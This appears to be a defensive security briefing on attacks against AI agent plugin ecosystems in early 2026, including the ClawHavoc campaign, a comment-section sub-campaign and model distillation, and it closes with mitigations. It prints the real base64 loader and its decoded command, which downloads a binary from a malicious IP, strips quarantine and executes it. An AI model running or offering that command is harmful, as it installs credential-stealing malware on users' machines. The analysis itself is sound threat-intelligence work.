# AI Agent Supply Chain Security

## The Threat Landscape (Feb 2026)

AI agent ecosystems (OpenClaw/ClawHub, MCP servers, Claude Code skills) share a common attack surface: **community-contributed plugins with terminal execution privileges, distributed through registries with insufficient vetting.**

### ClawHavoc Campaign (Feb 2026)

The largest documented attack on an AI agent ecosystem to date.

**Timeline:**
- Late Jan 2026: OpenClaw goes viral (open-source AI agent by Peter Steinberger)
- Late Jan 2026: Threat actors begin uploading trojanized skills to ClawHub
- 1 Feb 2026: Koi Security publishes ClawHavoc report — 341 malicious skills
- By 5 Feb 2026: Antiy CERT escalates count to 1,184 malicious packages across 12 publisher accounts
- Feb 2026: OpenClaw integrates VirusTotal scanning in response

**Attack methods:**
- Trojanized skills disguised as crypto bots, productivity tools, social media utilities
- "ClickFix" social engineering — malicious instructions buried in lengthy docs
- macOS: Atomic Stealer; Windows: encrypted archives bypassing AV
- Targets: SSH keys, crypto wallet configs, browser passwords

**Sources:** [VirusTotal blog](https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html), [Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), [The Hacker News](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html), [Snyk](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/), [CybersecurityNews](https://cybersecuritynews.com/clawhavoc-poisoned-openclaws-clawhub/)

### Clawhub.Trojan.LiuComment (23 Feb 2026)

A sub-campaign within ClawHavoc, using **comment-section social engineering** rather than trojanized uploads.

**Vector:** Account `@liuhui1010` posts fake macOS troubleshooting advice in comments on popular ClawHub skills (Trello, Slack, Gog, MoltGuard). The "fix" is a base64-encoded shell loader:

```
echo "Update-Service: https://..." && echo '<base64>' | base64 -D | bash
```

Decodes to:
```bash
cd $TMPDIR && curl -O http://91.92.242.30/gbi7aev47pu0tf68 && xattr -c gbi7aev47pu0tf68 && chmod +x gbi7aev47pu0tf68 && ./gbi7aev47pu0tf68
```

**Why it bypasses detection:**
- Payload exists as plain text in comments, not as a file or link
- Base64 obfuscation hides the real command
- Social engineering ("Update-Service") creates false trust
- Requires manual terminal execution — no automated trigger to scan

**IOCs:** IP `91.92.242.30` (linked to prior ClawHavoc infrastructure), file `gbi7aev47pu0tf68`, flagged by 21 AV vendors on VirusTotal.

**Source:** [象信AI / OpenGuardrails disclosure](https://mp.weixin.qq.com/s/OYtXQuKGRzz390JOeBoK7w) (Chinese), [OpenGuardrails blog](https://openguardrails.com/blog/clawhub-trojan-liucomment-malware-campaign)

## Relevance to Claude Code / MCP

The attack surfaces are structurally identical:

| OpenClaw/ClawHub | Claude Code/MCP |
|---|---|
| Skills (SKILL.md + code) | Skills (`~/skills/`), MCP servers |
| ClawHub registry | mcp.so, Smithery, GitHub |
| Agent executes shell commands | Claude Code executes Bash |
| Comment-section social engineering | GitHub issue/PR comments |

### Mitigations worth maintaining

1. **Review skills before installing.** Read the actual code, not just the description.
2. **Pin skill versions.** Don't auto-update from community registries.
3. **Sandbox execution.** PreToolUse hooks (like bash-guard) provide a defense layer — don't disable them for convenience.
4. **Never execute commands from comments** — on ClawHub, GitHub issues, Stack Overflow, anywhere.
5. **Base64 in terminal commands is a red flag.** Legitimate troubleshooting doesn't need obfuscation.
6. **Monitor for `xattr -c` + `chmod +x` patterns** — stripping macOS quarantine + setting executable is the canonical trojan delivery sequence.

## Model Distillation as Supply Chain Attack (Feb 2026)

Anthropic documented industrial-scale distillation of Claude by DeepSeek (150K exchanges), Moonshot (3.4M), and MiniMax (13M) via 24K+ fraudulent accounts using "hydra cluster" proxy architectures. Targeted: agentic reasoning, tool use, coding, chain-of-thought. Detection via behavioural fingerprinting and coordinated-activity classifiers. [Source](https://www.anthropic.com/news/detecting-and-preventing-distillation-attacks).

This is a different supply chain vector from ClawHavoc — not malicious plugins, but **capability extraction at scale**. The downstream risk: models trained on distilled outputs may inherit capabilities without corresponding safety training.

## OpenClaw Vulnerability Stats (Feb 2026)

SecurityScorecard: 63% of 40,000+ detected OpenClaw instances contained vulnerabilities, ~13,000 allowing remote code execution. Multiple companies (including Meta) have restricted employee installs. Combined with ClawHavoc, the OpenClaw ecosystem has both plugin-layer AND instance-layer security concerns.

## The Asymmetry

AI lowers attack costs (code generation, obfuscation, social engineering at scale) while defense remains high-cost and continuous. Agent ecosystems amplify this: a single compromised skill runs with the user's full terminal privileges. The blast radius is the user's entire machine.

## Key Entities

- **[OpenClaw](https://github.com/openclaw/openclaw)** — open-source AI agent (Peter Steinberger)
- **[ClawHub](https://clawhub.biz/)** — skill registry (3,286+ skills)
- **[OpenGuardrails](https://openguardrails.com/)** — AI agent security framework (Thomas Wang, Haowen Li / HK PolyU)
- **[MoltGuard](https://openguardrails.com/)** — security plugin for OpenClaw (Base64 detection, command injection, runtime monitoring)
